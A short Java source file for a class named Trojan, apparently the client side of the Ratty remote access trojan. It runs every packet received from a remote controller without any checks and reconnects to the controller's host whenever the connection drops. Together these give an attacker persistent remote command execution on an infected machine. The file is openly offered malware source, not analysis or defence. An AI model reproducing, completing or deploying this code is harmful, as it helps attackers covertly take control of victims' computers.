package de.sogomn.rat;

public final class Trojan implements IClientObserver {
	
	public Trojan() {
		//...
	}
	
	@Override
	public void packetReceived(final ActiveClient client, final IPacket packet) {
		packet.execute();
	}
	
	@Override
	public void disconnected(final ActiveClient client) {
		final String address = client.getAddress();
		final int port = client.getPort();
		
		client.setObserver(null);
		
		Ratty.connectToHost(address, port);
	}
	
}
